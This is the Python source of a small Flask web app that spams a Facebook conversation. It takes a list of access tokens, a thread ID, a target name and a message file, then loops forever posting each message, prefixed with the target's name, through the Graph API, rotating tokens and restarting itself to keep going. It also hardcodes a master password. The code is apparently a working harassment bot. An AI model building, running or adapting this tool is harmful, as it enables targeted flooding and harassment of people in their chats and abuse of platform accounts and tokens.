from flask import Flask, render_template, request, jsonify
import threading, time, requests, os, uuid, json, datetime

app = Flask(__name__)

MASTER_PASSWORD = "Axel67"
TASKS_FILE = "tasks.json"
tasks = {}
URL = "https://ayush-convo-pz57.onrender.com"

def log_event(msg):
    with open("restart_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {msg}\n")
    print(msg)

def load_tasks():
    if os.path.exists(TASKS_FILE):
        with open(TASKS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            for task_id, config in data.items():
                tasks[task_id] = {"running": True, "thread": None}
                t = threading.Thread(target=send_messages, args=(task_id, config))
                tasks[task_id]["thread"] = t
                t.start()
                log_event(f"🔁 Restarted task {task_id}")

def save_tasks():
    active = {}
    for tid, val in tasks.items():
        if val["running"]:
            active[tid] = val["config"]
    with open(TASKS_FILE, "w", encoding="utf-8") as f:
        json.dump(active, f, indent=2)

def send_messages(task_id, config):
    tokens = config["tokens"]
    convo_id = config["convo_id"]
    haters_name = config["haters_name"]
    delay = int(config["delay"])
    np_file = config["np_file"]

    if not os.path.exists(np_file):
        log_event(f"[x] File missing: {np_file}")
        return

    with open(np_file, "r", encoding="utf-8") as f:
        messages = [m.strip() for m in f.readlines() if m.strip()]

    count = 0
    while tasks[task_id]["running"]:
        for msg in messages:
            if not tasks[task_id]["running"]:
                break
            for token in tokens:
                try:
                    url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
                    payload = {"access_token": token, "message": f"{haters_name} {msg}"}
                    r = requests.post(url, data=payload)
                    count += 1
                    log_event(f"[{task_id}] Sent {count}: {haters_name} {msg} | {r.status_code}")
                    time.sleep(delay)
                except Exception as e:
                    log_event(f"[{task_id}] Error: {e}")
                    time.sleep(5)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start_task():
    try:
        password = request.form.get("password")
        if password != MASTER_PASSWORD:
            return jsonify({"status": "Invalid Password!"}), 401

        token_option = request.form.get("tokenOption")
        tokens = []
        if token_option == "single":
            single_token = request.form.get("singleToken")
            if single_token:
                tokens = [single_token.strip()]
        else:
            token_file = request.files.get("tokenFile")
            if token_file:
                content = token_file.read().decode("utf-8")
                tokens = [t.strip() for t in content.splitlines() if t.strip()]

        convo_id = request.form.get("threadId")
        haters_name = request.form.get("kidx")
        delay = request.form.get("time")

        txt_file = request.files.get("txtFile")
        np_path = f"np_{uuid.uuid4().hex}.txt"
        if txt_file:
            txt_file.save(np_path)

        config = {
            "tokens": tokens,
            "convo_id": convo_id,
            "haters_name": haters_name,
            "delay": delay,
            "np_file": np_path
        }

        task_id = str(uuid.uuid4())[:8]
        tasks[task_id] = {"running": True, "thread": None, "config": config}
        save_tasks()

        t = threading.Thread(target=send_messages, args=(task_id, config))
        tasks[task_id]["thread"] = t
        t.start()

        return jsonify({"status": "Task started successfully", "task_id": task_id})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/stop", methods=["POST"])
def stop_task():
    try:
        task_id = request.form.get("taskId")
        if task_id in tasks and tasks[task_id]["running"]:
            tasks[task_id]["running"] = False
            save_tasks()
            return jsonify({"status": f"Task {task_id} stopped"})
        return jsonify({"status": f"No active task with ID {task_id}"})
    except Exception as e:
        return jsonify({"error": str(e)})

def monitor_server():
    while True:
        time.sleep(120)
        try:
            r = requests.get(URL, timeout=10)
            if r.status_code != 200:
                log_event(f"⚠️ Bad response {r.status_code} restarting...")
                restart_server()
        except Exception as e:
            log_event(f"❌ Error: {e} restarting...")
            restart_server()

def restart_server():
    log_event("♻️ Restart triggered...")
    save_tasks()
    os.execv(__file__, ['python3'] + [__file__])

threading.Thread(target=monitor_server, daemon=True).start()

if __name__ == "__main__":
    log_event("🚀 Server started successfully")
    load_tasks()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
